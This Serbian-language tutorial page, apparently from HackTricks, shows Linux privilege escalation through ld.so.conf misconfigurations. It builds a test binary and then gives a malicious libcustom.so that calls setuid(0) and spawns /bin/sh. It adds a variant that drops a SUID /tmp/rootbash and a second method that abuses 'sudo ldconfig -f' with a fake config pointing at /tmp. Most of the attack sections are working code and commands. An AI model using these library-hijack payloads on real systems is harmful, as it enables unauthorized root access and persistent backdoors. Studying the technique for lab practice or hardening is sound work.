# primer ld.so privesc exploit-a

{{#include ../../banners/hacktricks-training.md}}

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te fajlove na svojoj mašini u istoj fascikli
2. **Kompajlirajte** **biblioteku**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib` i osvežite cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompajlirajte** **izvršni fajl**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Provera okruženja

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete da **izvršite** binarni fajl.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne triage komande

Prilikom napada na stvarnu metu, proverite **tačan naziv biblioteke** koji je potreban binarnoj datoteci i šta loader **trenutno razrešava**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Nekoliko korisnih napomena:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne radi** zato što redirekciju izvršava vaša trenutna shell sesija. Umesto toga koristite
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binarni fajlovi ignorišu `LD_LIBRARY_PATH`/`LD_PRELOAD` u
**secure-execution mode**, ali direktorijumi koji potiču iz `/etc/ld.so.conf` su
i dalje deo pouzdane konfiguracije loadera, tako da ova pogrešna konfiguracija i dalje
može uticati na privileged programe.<sup>[[1]](#references)</sup>
- U novijim verzijama glibc-a, dynamic loader takođe nudi
`--list-diagnostics`, što je korisno za otklanjanje problema sa rezolucijom cache-a i
izborom `glibc-hwcaps` poddirektorijuma kada hijack ne funkcioniše
očekivano.<sup>[[1]](#references)</sup>

## Exploit

U ovom scenariju pretpostavićemo da je **neko kreirao ranjivu stavku** unutar fajla u _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerabilni folder je _/home/ubuntu/lib_ (gde imamo pristup za pisanje).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili drugi privilegovani nalog) kasnije izvršiti ranjivi binarni fajl, obično je bolje ostaviti **artefakt u vlasništvu root-a** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se izvrši privilegovano izvršavanje, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali malicioznu libcustom biblioteku unutar pogrešno konfigurisane** putanje, potrebno je da sačekamo **reboot** ili da root korisnik izvrši **`ldconfig`** (_u slučaju da ovaj binary možete izvršiti kao **sudo** ili ima **suid bit**, moći ćete sami da ga izvršite_).

Kada se to dogodi, ponovo **proverite** odakle izvršni fajl `sharedvuln` učitava `libcustom.so` biblioteku:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava ga iz `/home/ubuntu/lib`**, a ako ga bilo koji korisnik izvrši, pokrenuće se shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali ćemo izmenom izvršenih komandi i **čekanjem da root ili drugi privilegovani korisnik izvrši ranjivi binarni fajl** moći da eskaliramo privilegije.

### Druge pogrešne konfiguracije - Ista vuln

U prethodnom primeru smo simulirali pogrešnu konfiguraciju u kojoj je administrator **postavio folder bez privilegija unutar konfiguracione datoteke u `/etc/ld.so.conf.d/`**.\
Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost. Ako imate **dozvole za pisanje** u nekoj **konfiguracionoj datoteci** unutar `/etc/ld.so.conf.d`, u folderu `/etc/ld.so.conf.d` ili u fajlu `/etc/ld.so.conf`, možete konfigurisati istu ranjivost i iskoristiti je.

## Exploit 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
Možete navesti `ldconfig` **odakle da učita conf fajlove**, pa to možemo iskoristiti da nateramo `ldconfig` da učita proizvoljne foldere.<sup>[[2]](#references)</sup>\
Dakle, napravimo fajlove i foldere potrebne za učitavanje foldera "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom exploit-u**, **kreirajte malicioznu biblioteku unutar `/tmp`**.\
I na kraju, učitajmo putanju i proverimo odakle binarni fajl učitava biblioteku:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, posedovanje sudo privilegija nad `ldconfig` omogućava iskorišćavanje iste ranjivosti.**

## Reference

- [1] [ld.so(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
